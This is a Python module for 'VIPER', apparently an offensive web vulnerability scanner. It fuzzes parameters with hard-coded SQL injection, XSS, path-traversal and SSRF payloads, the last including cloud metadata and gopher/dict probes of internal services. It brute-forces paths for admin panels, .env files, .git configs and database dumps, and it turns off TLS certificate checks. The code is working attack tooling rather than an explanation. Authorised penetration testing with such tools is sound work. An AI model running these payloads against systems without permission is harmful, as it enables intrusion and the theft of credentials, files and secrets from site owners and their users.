#!/usr/bin/env python3
"""
VIPER Scanner Module - Active Scanning Functions

Provides:
- HTTP fuzzing
- Parameter discovery
- Vulnerability scanning
- Response analysis

Author: VIPER Contributors
"""

import urllib.request
import logging

logger = logging.getLogger("viper.scanner")
import urllib.parse
import urllib.error
import ssl
import json
import re
import time
import socket
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path


@dataclass
class ScanResult:
    """Result from a single scan probe."""
    url: str
    method: str
    status_code: int
    content_length: int
    response_time: float
    headers: Dict[str, str]
    body_preview: str
    interesting: bool = False
    findings: List[str] = field(default_factory=list)


class HTTPScanner:
    """
    HTTP-based vulnerability scanner.
    Pure Python, no external dependencies.
    """
    
    def __init__(self, timeout: int = 10, threads: int = 10):
        self.timeout = timeout
        self.threads = threads
        self.session_cookies = {}
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) VIPER/1.0",
            "Accept": "text/html,application/json,*/*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        # Create SSL context that doesn't verify (for testing)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
    
    def request(self, url: str, method: str = "GET", 
                data: Optional[Dict] = None,
                headers: Optional[Dict] = None) -> ScanResult:
        """Make an HTTP request and return structured result."""
        start_time = time.time()
        merged_headers = {**self.headers, **(headers or {})}
        
        try:
            if data and method == "POST":
                encoded_data = urllib.parse.urlencode(data).encode('utf-8')
                req = urllib.request.Request(url, data=encoded_data, method=method)
            else:
                req = urllib.request.Request(url, method=method)
            
            for key, value in merged_headers.items():
                req.add_header(key, value)
            
            with urllib.request.urlopen(req, timeout=self.timeout, 
                                        context=self.ssl_context) as response:
                body = response.read().decode('utf-8', errors='ignore')
                elapsed = time.time() - start_time
                
                return ScanResult(
                    url=url,
                    method=method,
                    status_code=response.status,
                    content_length=len(body),
                    response_time=elapsed,
                    headers=dict(response.headers),
                    body_preview=body[:500],
                    interesting=False,
                    findings=[]
                )
        
        except urllib.error.HTTPError as e:
            elapsed = time.time() - start_time
            body = ""
            try:
                body = e.read().decode('utf-8', errors='ignore')
            except Exception as e:  # noqa: BLE001
                pass
            
            return ScanResult(
                url=url,
                method=method,
                status_code=e.code,
                content_length=len(body),
                response_time=elapsed,
                headers=dict(e.headers) if e.headers else {},
                body_preview=body[:500],
                interesting=e.code in [403, 401, 500],
                findings=[f"HTTP {e.code}: {e.reason}"]
            )
        
        except Exception as e:
            elapsed = time.time() - start_time
            return ScanResult(
                url=url,
                method=method,
                status_code=0,
                content_length=0,
                response_time=elapsed,
                headers={},
                body_preview="",
                interesting=False,
                findings=[f"Error: {str(e)}"]
            )
    
    def fuzz_parameters(self, url: str, params: Dict[str, str], 
                       payloads: List[str]) -> List[ScanResult]:
        """Fuzz each parameter with payloads."""
        results = []
        
        for param_name in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                # Build URL with params
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.urlencode(test_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                result = self.request(test_url)
                result = self._analyze_response(result, payload)
                results.append(result)
        
        return results
    
    def _analyze_response(self, result: ScanResult, payload: str) -> ScanResult:
        """Analyze response for vulnerability indicators."""
        body = result.body_preview.lower()
        
        # SQL Injection indicators
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
            "sql error", "syntax error", "unclosed quotation",
            "unterminated string", "odbc", "jdbc"
        ]
        for indicator in sql_errors:
            if indicator in body:
                result.interesting = True
                result.findings.append(f"SQL Error: '{indicator}' found")
        
        # XSS reflection
        if payload.lower() in body:
            result.interesting = True
            result.findings.append("Payload reflected in response")
        
        # Path traversal
        if "root:" in body or "/etc/passwd" in body:
            result.interesting = True
            result.findings.append("Possible LFI - /etc/passwd content")
        
        # Error disclosure
        if "exception" in body or "stack trace" in body or "traceback" in body:
            result.interesting = True
            result.findings.append("Error/exception disclosure")
        
        # Time-based detection (slow response might indicate injection)
        if result.response_time > 5:
            result.interesting = True
            result.findings.append(f"Slow response: {result.response_time:.1f}s")
        
        return result
    
    def directory_bruteforce(self, base_url: str, 
                            wordlist: List[str]) -> List[ScanResult]:
        """Bruteforce directories and files."""
        results = []
        base_url = base_url.rstrip('/')
        
        def check_path(path: str) -> ScanResult:
            url = f"{base_url}/{path}"
            result = self.request(url)
            if result.status_code in [200, 301, 302, 403]:
                result.interesting = True
            return result
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_path, path): path for path in wordlist}
            for future in as_completed(futures):
                result = future.result()
                if result.interesting:
                    results.append(result)
        
        return results


class VulnerabilityScanner:
    """
    Vulnerability-specific scanners.
    """
    
    def __init__(self):
        self.http = HTTPScanner()
    
    def scan_sqli(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for SQL injection."""
        findings = []
        
        sqli_payloads = [
            "'", "''", "\"", "1'", "1\"",
            "' OR '1'='1", "' OR '1'='1'--",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "1' UNION SELECT NULL--",
            "1' AND '1'='1", "1' AND '1'='2",
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
        ]
        
        results = self.http.fuzz_parameters(url, params, sqli_payloads)
        
        for result in results:
            if result.interesting:
                findings.append({
                    "type": "sqli",
                    "url": result.url,
                    "findings": result.findings,
                    "response_time": result.response_time
                })
        
        return findings
    
    def scan_xss(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for XSS vulnerabilities."""
        findings = []
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "{{7*7}}",  # SSTI probe
        ]
        
        results = self.http.fuzz_parameters(url, params, xss_payloads)
        
        for result in results:
            if result.interesting:
                findings.append({
                    "type": "xss",
                    "url": result.url,
                    "findings": result.findings
                })
        
        return findings
    
    def scan_lfi(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Local File Inclusion."""
        findings = []
        
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd%00",
            "....//....//....//etc/passwd%00",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/proc/self/environ",
        ]
        
        results = self.http.fuzz_parameters(url, params, lfi_payloads)
        
        for result in results:
            if result.interesting:
                findings.append({
                    "type": "lfi",
                    "url": result.url,
                    "findings": result.findings
                })
        
        return findings
    
    def scan_ssrf(self, url: str, params: Dict[str, str]) -> List[Dict]:
        """Test for Server-Side Request Forgery."""
        findings = []
        
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0.0.0.0",
            "http://localtest.me",
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "gopher://localhost:6379/_INFO",
        ]
        
        results = self.http.fuzz_parameters(url, params, ssrf_payloads)
        
        for result in results:
            if result.interesting:
                findings.append({
                    "type": "ssrf",
                    "url": result.url,
                    "findings": result.findings
                })
        
        return findings
    
    def scan_all(self, url: str, params: Dict[str, str]) -> Dict:
        """Run all vulnerability scans."""
        return {
            "sqli": self.scan_sqli(url, params),
            "xss": self.scan_xss(url, params),
            "lfi": self.scan_lfi(url, params),
            "ssrf": self.scan_ssrf(url, params)
        }


class ReconScanner:
    """
    Reconnaissance functions.
    """
    
    def __init__(self):
        self.http = HTTPScanner()
    
    def discover_endpoints(self, base_url: str) -> List[str]:
        """Discover common endpoints."""
        common_paths = [
            # Admin panels
            "admin", "administrator", "admin.php", "admin.html",
            "wp-admin", "cpanel", "phpmyadmin", "adminer",
            
            # API endpoints
            "api", "api/v1", "api/v2", "graphql", "rest",
            "swagger", "swagger.json", "openapi.json",
            
            # Config/Debug
            ".env", "config.php", "config.json", "settings.json",
            "debug", "phpinfo.php", "info.php", "test.php",
            
            # Version control
            ".git/HEAD", ".git/config", ".svn/entries",
            ".hg/hgrc", ".gitignore", ".htaccess",
            
            # Backups
            "backup", "backup.zip", "backup.sql", "dump.sql",
            "database.sql", "db.sql", "site.zip",
            
            # Common files
            "robots.txt", "sitemap.xml", "crossdomain.xml",
            "security.txt", ".well-known/security.txt",
            
            # Login/Auth
            "login", "signin", "auth", "oauth", "logout",
            "register", "signup", "forgot-password",
            
            # User areas
            "user", "users", "profile", "account", "dashboard",
            "settings", "preferences",
        ]
        
        results = self.http.directory_bruteforce(base_url, common_paths)
        
        found = []
        for result in results:
            if result.status_code in [200, 301, 302]:
                found.append({
                    "url": result.url,
                    "status": result.status_code,
                    "size": result.content_length
                })
        
        return found
    
    def fingerprint(self, url: str) -> Dict:
        """Fingerprint technologies used."""
        result = self.http.request(url)
        
        tech = {
            "server": None,
            "powered_by": None,
            "frameworks": [],
            "cms": None,
            "security_headers": {}
        }
        
        headers = result.headers
        
        # Server
        tech["server"] = headers.get("Server", headers.get("server"))
        tech["powered_by"] = headers.get("X-Powered-By", headers.get("x-powered-by"))
        
        # Security headers
        security_headers = [
            "X-Frame-Options", "X-XSS-Protection", "X-Content-Type-Options",
            "Content-Security-Policy", "Strict-Transport-Security",
            "X-Permitted-Cross-Domain-Policies"
        ]
        for header in security_headers:
            val = headers.get(header, headers.get(header.lower()))
            if val:
                tech["security_headers"][header] = val
        
        # Framework detection from body
        body = result.body_preview.lower()
        
        if "wp-content" in body or "wordpress" in body:
            tech["cms"] = "WordPress"
        elif "drupal" in body:
            tech["cms"] = "Drupal"
        elif "joomla" in body:
            tech["cms"] = "Joomla"
        
        if "react" in body or "reactdom" in body:
            tech["frameworks"].append("React")
        if "angular" in body or "ng-" in body:
            tech["frameworks"].append("Angular")
        if "vue" in body:
            tech["frameworks"].append("Vue.js")
        if "jquery" in body:
            tech["frameworks"].append("jQuery")
        
        return tech


# Export
__all__ = [
    "ScanResult",
    "HTTPScanner", 
    "VulnerabilityScanner",
    "ReconScanner"
]
